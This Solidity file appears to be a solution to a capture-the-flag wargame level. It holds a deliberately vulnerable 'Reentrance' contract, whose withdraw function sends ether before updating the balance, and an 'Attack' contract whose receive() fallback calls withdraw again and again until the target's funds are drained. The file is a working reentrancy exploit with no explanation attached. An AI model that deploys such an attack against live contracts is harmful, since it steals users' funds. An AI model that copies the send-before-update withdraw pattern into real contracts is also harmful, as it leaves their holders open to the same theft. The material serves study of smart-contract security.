// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attack {

  Reentrance reentrance;

  constructor(address payable _reentranceAddr) public {
    reentrance = Reentrance(_reentranceAddr);
  }

  function deposit() public payable {
    reentrance.donate{value: msg.value}(address(this));
  }

  receive() external payable {
    if (address(reentrance).balance < msg.value) return;

    reentrance.withdraw(msg.value);
  }
}
